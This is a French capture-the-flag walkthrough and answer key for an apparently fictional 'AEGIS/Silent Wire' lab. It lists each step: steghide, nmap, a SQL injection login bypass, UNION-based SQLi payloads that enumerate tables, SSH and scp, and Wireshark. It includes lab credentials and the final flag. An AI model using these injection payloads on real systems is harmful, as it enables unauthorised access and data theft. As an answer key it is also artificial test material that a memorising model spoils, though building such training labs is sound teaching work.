```
Pour se connecter à la machine Kali :
-login : kali
-mdp: kali

## Chaîne des indices — parcours complet

ÉTAPE 0   Email DGSI reçu dans Thunderbird
          → Photo jointe → steghide → identifiants tlalimace / Hermes2026!

ÉTAPE 1   nmap -sV 192.168.56.10
          → Ports : 80, 22, 8080

ÉTAPE 2   Site AEGIS port 80
          → Accès collaborateur -> Profil Thomas → lien vers /intranet/login.php

ÉTAPE 3   Connexion intranet avec tlalimace / Hermes2026!
          → Onglet Tickets  : ticket #4523 supprimé → contacter admin
          → Onglet Documents : accès restreint → saisir code admin

ÉTAPE 4   SQLi sur /intranet/login — bypass login
          → Identifiant : ' OR '1'='1
          → Accès panneau admin obtenu (Marc est l'administrateur)

ÉTAPE 5   Panneau admin — onglet Tickets
          → Ticket #4523 : message Thomas
            "communications espionnées — voir enregistrement dans mes documents"
          → Ticket #161 : échange direction/admin
            → code documents : AEGIS_SECURE_2026

ÉTAPE 6   Retour dashboard Thomas — onglet Documents
          → Code AEGIS_SECURE_2026 → documents déverrouillés
          → Note_Vocale_Incident.wav → strings Note_Vocale_Incident.wav
            "preuves dans la bdd hermes.surveille" + nom du répertoire qui stocke le fichier "/var/log/network_captures/hermes"

ÉTAPE 7   SQLi — documents recherche panneau admin
          Récupérer le nom des colonnes de la table surveille :
          → ' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name='surveille'-- -
          Récupérer le nom du fichier pcap
          → ' UNION SELECT 1,localisation,nom_fichier_pcap,4,5,6 FROM hermes.surveille-- -
            capture     : ghost_evidence.pcap

ÉTAPE 8   SSH — connexion avec mot de passe reconstitué
          → Onglet note : "nomChat"
          → nomChat      = felix (note croquettes onglet Notes)
          → ssh thomas@192.168.56.10 -p 22
          → Mot de passe : felix
          → thomas@aegis:~$ cp /var/log/hermes/ghost_evidence.pcap ~/
          → scp -P 22 thomas@192.168.56.10:~/ghost_evidence.pcap .

ÉTAPE 9  Wireshark — Follow TCP Stream
          → Clic droit sur un paquet → Follow → TCP Stream
          → Conversation HERMES (rouge) → KH-RELAY-02 (bleu)
          → Rapport mensuel Silent Wire : 847 Go exfiltrés
          → Réponse KH-RELAY-02 : accusé réception + clé validation
          → FLAG{S1L3NT_W1R3_TL_2026}

ÉTAPE F   Soumission sur [http://192.168.56.10:8080](http://192.168.56.10/agence-mission/submit.php)
```
